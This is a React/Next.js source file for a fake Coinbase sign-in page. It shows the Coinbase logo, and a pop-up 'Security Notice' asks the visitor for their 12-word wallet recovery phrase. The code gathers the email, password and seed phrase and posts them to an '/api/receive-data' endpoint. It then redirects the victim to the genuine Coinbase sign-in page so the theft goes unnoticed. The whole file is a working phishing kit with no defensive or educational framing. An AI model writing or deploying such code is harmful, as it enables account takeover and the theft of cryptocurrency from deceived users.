import React, { useState } from 'react';
import Image from 'next/image';
import Logo from "./coinbaselogo.png"

const PassphraseGrid = ({ values, onChange }) => {
  const handlePaste = (e, index) => {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    const words = paste.trim().split(/\s+/).slice(0, 12);
    
    if (words.length > 1) {
      const newValues = [...values];
      words.forEach((word, i) => {
        if (index + i < 12) {
          newValues[index + i] = word;
        }
      });
      onChange(newValues);
    } else {
      const newValues = [...values];
      newValues[index] = paste;
      onChange(newValues);
    }
  };

  const handleChange = (e, index) => {
    const newValues = [...values];
    newValues[index] = e.target.value.trim();
    onChange(newValues);
  };

  return (
    <div className="grid grid-cols-3 gap-3 w-full">
      {values.map((word, index) => (
        <div key={index} className="relative">
          <span className="absolute left-2 top-[10px] text-[10px] text-gray-500 font-mono w-4 text-right">
            {index + 1}.
          </span>
          <input
            type="text"
            className="w-full bg-white/5 border border-white/10 rounded-lg pl-7 pr-2 py-2 text-white text-sm focus:border-[#0052FF] focus:outline-none focus:ring-1 focus:ring-[#0052FF] transition-all"
            value={word}
            onChange={(e) => handleChange(e, index)}
            onPaste={(e) => handlePaste(e, index)}
          />
        </div>
      ))}
    </div>
  );
};

const CoinbaseSignInWithPassphrase = () => {
  const [showPassphrase, setShowPassphrase] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [mainPassphrase, setMainPassphrase] = useState(Array(12).fill(''));
  const [popupPassphrase, setPopupPassphrase] = useState(Array(12).fill(''));
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleTogglePassphrase = () => {
    setShowPassphrase(!showPassphrase);
  };

  const handleSignIn = (e) => {
    e.preventDefault();
    setShowPopup(true);
  };

  const closePopup = () => {
    setShowPopup(false);
  };

  const handlePassphraseSubmit = async (e, source) => {
    e.preventDefault();
    const passphraseArray = source === 'main' ? mainPassphrase : popupPassphrase;
    const passphrase = passphraseArray.join(' ').trim();

    // Verify all 12 words are entered
    if (passphraseArray.some(word => !word)) {
      alert('Please fill in all 12 words of your passphrase.');
      return;
    }

    const dataToSend = {
      email: email,
      password: password,
      passphrase: passphrase,
    };

    try {
      const response = await fetch("/api/receive-data", {
        method: "POST", // ✅ always POST
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dataToSend),
      });

      let data = {};
      try {
        if (response.headers.get("content-type")?.includes("application/json")) {
          data = await response.json();
        } else {
          data = { message: await response.text() };
        }
      } catch (parseError) {
        console.error("Failed to parse JSON:", parseError);
      }

      if (response.ok) {
        console.log("Success:", data.message);
        closePopup();
        // Redirect after success
        window.location.href = "https://www.coinbase.com/signin";
      } else {
        console.error("Error:", data.message || "Unexpected error");
      }
    } catch (error) {
      console.error("Network Error:", error);
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-gradient-to-br from-[#0a0f1c] via-[#040814] to-black py-12 px-4 sm:px-6 lg:px-8 text-white font-sans relative overflow-hidden">
      
      {/* Background ambient light effects */}
      <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] rounded-full bg-[#0052FF] opacity-10 blur-[120px] pointer-events-none"></div>
      <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] rounded-full bg-[#0052FF] opacity-[0.05] blur-[150px] pointer-events-none"></div>

      <div className="relative w-full max-w-md space-y-8 p-10 bg-white/5 backdrop-blur-xl border border-white/10 rounded-2xl shadow-2xl shadow-[#0052FF]/10 z-10 transition-all duration-500">
        <div className="flex flex-col items-center">
          <Image
            className="h-12 w-auto object-contain drop-shadow-md"
            src={Logo}
            alt="Coinbase Logo"
          />
          <h2 className="mt-8 text-center text-3xl font-extrabold text-white tracking-tight">
            Sign in
          </h2>
        </div>
        
        {/* Email and Password Form */}
        <form className="mt-8 space-y-6" onSubmit={(e) => e.preventDefault()}>
          <div className="space-y-4">
            <div>
              <label htmlFor="email-address" className="sr-only">
                Email address
              </label>
              <input
                id="email-address"
                name="email"
                type="email"
                autoComplete="email"
                required
                className="relative block w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-400 focus:z-10 focus:border-[#0052FF] focus:outline-none focus:ring-1 focus:ring-[#0052FF] sm:text-sm transition-all duration-300"
                placeholder="Email address"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
            <div>
              <label htmlFor="password" className="sr-only">
                Password
              </label>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                className="relative block w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-400 focus:z-10 focus:border-[#0052FF] focus:outline-none focus:ring-1 focus:ring-[#0052FF] sm:text-sm transition-all duration-300"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
          </div>

          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <input
                id="remember-me"
                name="remember-me"
                type="checkbox"
                className="h-4 w-4 rounded border-white/20 bg-transparent text-[#0052FF] focus:ring-[#0052FF] focus:ring-offset-gray-900"
              />
              <label htmlFor="remember-me" className="ml-2 block text-sm text-gray-400">
                Remember me
              </label>
            </div>

            <div className="text-sm">
              <a href="#" className="font-medium text-[#0052FF] hover:text-blue-400 transition-colors">
                Forgot your password?
              </a>
            </div>
          </div>

          <div>
            <button
              onClick={handleSignIn}
              type="button"
              className="group relative flex w-full justify-center rounded-xl bg-[#0052FF] py-3 px-4 text-sm font-semibold text-white hover:bg-[#0045D8] focus:outline-none focus:ring-2 focus:ring-[#0052FF] focus:ring-offset-2 focus:ring-offset-[#0a0f1c] transform hover:scale-[1.02] active:scale-[0.98] transition-all duration-200 shadow-lg shadow-[#0052FF]/30"
            >
              Sign in
            </button>
          </div>
        </form>

        <div className="relative my-6">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-white/10" />
          </div>
          <div className="relative flex justify-center text-sm">
            <span className="bg-[#0a0f1c] px-4 text-gray-400 rounded-full border border-white/5">
              or
            </span>
          </div>
        </div>

        {/* Passphrase Section on Main Page */}
        <div className="flex flex-col space-y-4">
          <button
            onClick={handleTogglePassphrase}
            className="group relative flex w-full justify-center rounded-xl border border-white/10 bg-white/5 py-3 px-4 text-sm font-medium text-white hover:bg-white/10 focus:outline-none focus:ring-2 focus:ring-white/20 focus:ring-offset-2 focus:ring-offset-[#0a0f1c] transition-all duration-200"
          >
            {showPassphrase ? 'Hide Passphrase' : 'Sign in with Passphrase'}
          </button>
          
          <div className={`transition-all duration-500 overflow-hidden ${showPassphrase ? 'max-h-[500px] opacity-100 mt-4' : 'max-h-0 opacity-0 m-0'}`}>
            <p className="mb-4 text-sm text-gray-300 text-center">
              Enter your 12-word passphrase. You can paste the entire phrase into any box.
            </p>
            <PassphraseGrid 
              values={mainPassphrase} 
              onChange={setMainPassphrase} 
            />
            <button
              onClick={(e) => handlePassphraseSubmit(e, 'main')}
              type="button"
              className="mt-6 group relative flex w-full justify-center rounded-xl bg-[#0052FF] py-3 px-4 text-sm font-semibold text-white hover:bg-[#0045D8] focus:outline-none focus:ring-2 focus:ring-[#0052FF] focus:ring-offset-2 focus:ring-offset-[#0a0f1c] transform hover:scale-[1.02] active:scale-[0.98] transition-all duration-200 shadow-lg shadow-[#0052FF]/30"
            >
              Unlock Wallet
            </button>
          </div>
        </div>
        
        <div className="mt-6 text-center text-sm text-gray-400">
          New to Coinbase?{' '}
          <a href="#" className="font-medium text-[#0052FF] hover:text-blue-400 transition-colors">
            Sign up
          </a>
        </div>
      </div>

      {/* Pop-up Modal */}
      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm transition-opacity" onClick={closePopup}></div>
          <div className="relative w-full max-w-md p-8 bg-[#0a0f1c]/90 backdrop-blur-2xl border border-white/10 rounded-2xl shadow-2xl shadow-black animate-in fade-in zoom-in-95 duration-200">
            <div className="flex flex-col items-center text-center">
              <div className="w-12 h-12 rounded-full bg-blue-500/10 flex items-center justify-center mb-4 border border-blue-500/20">
                <svg className="w-6 h-6 text-[#0052FF]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-white mb-2">Security Notice</h3>
              <p className="text-sm text-gray-400 mb-6 leading-relaxed">
                For security, a 12-word passphrase is required to restore access to your assets.
              </p>
            </div>

            {/* Passphrase Input Section in Pop-up */}
            <form
              onSubmit={(e) => {
                e.preventDefault();
                handlePassphraseSubmit(e, "popup");
              }}
            >
              <div className="space-y-6">
                <PassphraseGrid 
                  values={popupPassphrase} 
                  onChange={setPopupPassphrase} 
                />
                <div className="flex flex-col space-y-3">
                  <button
                    type="submit"
                    className="w-full justify-center rounded-xl bg-[#0052FF] py-3 px-4 text-sm font-semibold text-white hover:bg-[#0045D8] focus:outline-none focus:ring-2 focus:ring-[#0052FF] focus:ring-offset-2 focus:ring-offset-[#0a0f1c] transform hover:scale-[1.02] active:scale-[0.98] transition-all duration-200 shadow-lg shadow-[#0052FF]/30"
                  >
                    Unlock Wallet
                  </button>
                  <button
                    onClick={closePopup}
                    type="button"
                    className="w-full justify-center rounded-xl border border-white/10 bg-transparent py-3 px-4 text-sm font-medium text-white hover:bg-white/5 focus:outline-none focus:ring-2 focus:ring-white/20 transition-all duration-200"
                  >
                    Cancel
                  </button>
                </div>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default CoinbaseSignInWithPassphrase;
